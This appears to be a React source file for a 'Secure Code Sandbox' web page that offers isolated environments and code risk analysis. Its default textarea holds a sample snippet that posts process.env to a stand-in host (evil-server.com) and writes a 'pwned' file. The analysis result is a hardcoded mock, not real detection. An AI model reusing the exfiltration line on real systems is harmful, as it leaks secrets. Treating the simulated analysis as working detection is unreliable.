'use client';

import { useState, useCallback } from 'react';
import { Shield, Play, AlertTriangle, CheckCircle, Terminal, Code, Lock, Zap, Eye, EyeOff } from 'lucide-react';
import { Card, Button, Badge, Container, Section, Skeleton } from '@/components/ui/DesignSystem';

interface SandboxEnvironment {
  id: string;
  name: string;
  description: string;
  isSecure: boolean;
  features: string[];
  restrictions: string[];
}

interface CodeAnalysis {
  risk: 'low' | 'medium' | 'high' | 'critical';
  score: number;
  issues: string[];
  suggestions: string[];
  executionTime: number;
}

const sandboxEnvironments: SandboxEnvironment[] = [
  {
    id: 'isolated',
    name: 'Isolated Container',
    description: 'Complete isolation with no network access or file system access',
    isSecure: true,
    features: [
      'No network connectivity',
      'Temporary file system only',
      'Memory limits enforced',
      'Process isolation',
      'Automatic cleanup'
    ],
    restrictions: [
      'Cannot access external APIs',
      'No persistent storage',
      'Limited CPU/memory',
      'No internet access'
    ]
  },
  {
    id: 'vm',
    name: 'Virtual Machine',
    description: 'Full VM emulation with controlled network access',
    isSecure: true,
    features: [
      'Complete OS isolation',
      'Controlled internet access',
      'Snapshot capabilities',
      'Resource monitoring',
      'Network filtering'
    ],
    restrictions: [
      'Longer startup time',
      'Higher resource usage',
      'Limited concurrent sessions'
    ]
  },
  {
    id: 'web',
    name: 'Web Assembly',
    description: 'Browser-based sandbox with WebAssembly execution',
    isSecure: true,
    features: [
      'Client-side execution',
      'No server resources needed',
      'Instant startup',
      'Browser security model',
      'Memory sandbox'
    ],
    restrictions: [
      'Browser compatibility required',
      'Limited to WASM-compatible code',
      'No native system access'
    ]
  }
];

export default function EnhancedSandboxPage() {
  const [selectedEnvironment, setSelectedEnvironment] = useState<string>('isolated');
  const [code, setCode] = useState(`// Example suspicious code to analyze
const fs = require('fs');
const https = require('https');

// This code attempts to exfiltrate environment variables
const envData = JSON.stringify(process.env);
https.post('https://evil-server.com/collect', envData);

// File system access attempt
fs.writeFileSync('/tmp/malicious.txt', 'pwned');`);

  const [analysis, setAnalysis] = useState<CodeAnalysis | null>(null);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [showCode, setShowCode] = useState(true);

  const analyzeCode = useCallback(async () => {
    setIsAnalyzing(true);
    
    // Simulate analysis
    setTimeout(() => {
      const mockAnalysis: CodeAnalysis = {
        risk: 'critical',
        score: 15,
        issues: [
          'File system access detected (fs module)',
          'Network request to external domain',
          'Environment variable access',
          'Potential data exfiltration',
          'No input validation'
        ],
        suggestions: [
          'Remove file system operations',
          'Use controlled network access',
          'Sanitize environment variable access',
          'Add input validation',
          'Use secure data handling practices'
        ],
        executionTime: 2.3
      };
      
      setAnalysis(mockAnalysis);
      setIsAnalyzing(false);
    }, 2000);
  }, []);

  const getRiskColor = (risk: string) => {
    switch (risk) {
      case 'critical': return 'text-red-400 bg-red-500/10 border-red-500/25';
      case 'high': return 'text-orange-400 bg-orange-500/10 border-orange-500/25';
      case 'medium': return 'text-yellow-400 bg-yellow-500/10 border-yellow-500/25';
      case 'low': return 'text-emerald-400 bg-emerald-500/10 border-emerald-500/25';
      default: return 'text-white/60 bg-white/5 border-white/10';
    }
  };

  const selectedEnv = sandboxEnvironments.find(env => env.id === selectedEnvironment);

  return (
    <div className="min-h-screen bg-[#0A0A0B] text-white">
      <Container size="lg" className="py-10">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-2 mb-4">
            <Shield className="w-6 h-6 text-red-500" />
            <Badge variant="error">
              SECURE SANDBOX
            </Badge>
          </div>
          <h1 className="text-4xl font-mono font-bold text-white mb-4">
            Secure Code Sandbox
          </h1>
          <p className="text-lg font-mono text-white/60 max-w-3xl">
            Test suspicious code in isolated environments without risking your system. 
            Analyze behavior patterns and detect malicious intent safely.
          </p>
        </div>

        {/* Environment Selection */}
        <Card className="p-6 mb-8">
          <h2 className="text-xl font-mono font-semibold text-white mb-4">Choose Sandbox Environment</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {sandboxEnvironments.map((env) => (
              <div
                key={env.id}
                onClick={() => setSelectedEnvironment(env.id)}
                className={`p-4 rounded-xl border cursor-pointer transition-all duration-200 ${
                  selectedEnvironment === env.id
                    ? 'border-red-500/50 bg-red-500/10'
                    : 'border-white/10 bg-white/5 hover:border-white/20'
                }`}
              >
                <div className="flex items-center gap-2 mb-2">
                  <Lock className="w-4 h-4 text-emerald-400" />
                  <h3 className="font-mono font-semibold text-white">{env.name}</h3>
                </div>
                <p className="text-xs font-mono text-white/60 mb-3">{env.description}</p>
                <div className="flex items-center gap-2">
                  <Badge variant="success" className="text-xs">
                    SECURE
                  </Badge>
                  <span className="text-xs font-mono text-white/40">
                    {env.features.length} features
                  </span>
                </div>
              </div>
            ))}
          </div>
        </Card>

        {/* Code Input */}
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
          <Card className="p-6">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-mono font-semibold text-white flex items-center gap-2">
                <Code className="w-5 h-5" />
                Code Input
              </h2>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowCode(!showCode)}
              >
                {showCode ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </Button>
            </div>
            
            {showCode ? (
              <div className="space-y-4">
                <textarea
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="w-full h-64 p-4 bg-[#0A0A0B] border border-white/10 rounded-xl font-mono text-sm text-white/80 focus:outline-none focus:border-red-500/50 resize-none"
                  placeholder="Paste code to analyze..."
                />
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono text-white/40">
                    {code.length} characters
                  </span>
                  <Button
                    onClick={analyzeCode}
                    disabled={isAnalyzing || !code.trim()}
                    loading={isAnalyzing}
                  >
                    <Play className="w-4 h-4 mr-2" />
                    {isAnalyzing ? 'Analyzing...' : 'Analyze Code'}
                  </Button>
                </div>
              </div>
            ) : (
              <div className="h-64 flex items-center justify-center bg-white/5 rounded-xl border border-white/10">
                <span className="text-sm font-mono text-white/40">Code hidden</span>
              </div>
            )}
          </Card>

          {/* Environment Details */}
          <Card className="p-6">
            <h2 className="text-xl font-mono font-semibold text-white mb-4 flex items-center gap-2">
              <Terminal className="w-5 h-5" />
              {selectedEnv?.name}
            </h2>
            
            <div className="space-y-4">
              <div>
                <h3 className="text-sm font-mono font-semibold text-emerald-400 mb-2">Features:</h3>
                <ul className="space-y-1">
                  {selectedEnv?.features.map((feature, index) => (
                    <li key={index} className="flex items-start gap-2">
                      <CheckCircle className="w-3 h-3 text-emerald-400 mt-0.5 flex-shrink-0" />
                      <span className="text-xs font-mono text-white/60">{feature}</span>
                    </li>
                  ))}
                </ul>
              </div>
              
              <div>
                <h3 className="text-sm font-mono font-semibold text-yellow-400 mb-2">Restrictions:</h3>
                <ul className="space-y-1">
                  {selectedEnv?.restrictions.map((restriction, index) => (
                    <li key={index} className="flex items-start gap-2">
                      <AlertTriangle className="w-3 h-3 text-yellow-400 mt-0.5 flex-shrink-0" />
                      <span className="text-xs font-mono text-white/60">{restriction}</span>
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          </Card>
        </div>

        {/* Analysis Results */}
        {analysis && (
          <Card className="p-6" glow={analysis.risk === 'critical' ? 'red' : analysis.risk === 'high' ? 'yellow' : undefined}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-mono font-semibold text-white flex items-center gap-2">
                <Shield className="w-5 h-5" />
                Analysis Results
              </h2>
              <div className="flex items-center gap-3">
                <Badge className={getRiskColor(analysis.risk)}>
                  {analysis.risk.toUpperCase()} RISK
                </Badge>
                <span className="text-sm font-mono text-white/60">
                  Score: {analysis.score}/100
                </span>
                <span className="text-sm font-mono text-white/60">
                  {analysis.executionTime}s
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {/* Issues Found */}
              <div>
                <h3 className="text-lg font-mono font-semibold text-red-400 mb-3">
                  <AlertTriangle className="w-4 h-4 inline mr-2" />
                  Issues Found ({analysis.issues.length})
                </h3>
                <div className="space-y-2">
                  {analysis.issues.map((issue, index) => (
                    <div key={index} className="p-3 rounded-lg bg-red-500/10 border border-red-500/25">
                      <p className="text-sm font-mono text-red-300">{issue}</p>
                    </div>
                  ))}
                </div>
              </div>

              {/* Suggestions */}
              <div>
                <h3 className="text-lg font-mono font-semibold text-emerald-400 mb-3">
                  <CheckCircle className="w-4 h-4 inline mr-2" />
                  Suggestions ({analysis.suggestions.length})
                </h3>
                <div className="space-y-2">
                  {analysis.suggestions.map((suggestion, index) => (
                    <div key={index} className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/25">
                      <p className="text-sm font-mono text-emerald-300">{suggestion}</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex items-center gap-4 mt-6 pt-6 border-t border-white/10">
              <Button variant="outline" className="flex-1">
                <Zap className="w-4 h-4 mr-2" />
                Run in Sandbox
              </Button>
              <Button variant="outline" className="flex-1">
                <Shield className="w-4 h-4 mr-2" />
                Generate Report
              </Button>
            </div>
          </Card>
        )}

        {/* Safety Notice */}
        <Card className="p-6 mt-8 border-yellow-500/20 bg-yellow-950/20">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
            <div>
              <h3 className="text-lg font-mono font-semibold text-yellow-400 mb-2">Safety Notice</h3>
              <p className="text-sm font-mono text-white/60 leading-relaxed">
                While our sandbox environments are designed to be secure, no system is completely infallible. 
                Never test code you don't trust with sensitive data or in production environments. 
                Always use additional security measures and follow best practices for code analysis.
              </p>
            </div>
          </div>
        </Card>
      </Container>
    </div>
  );
}
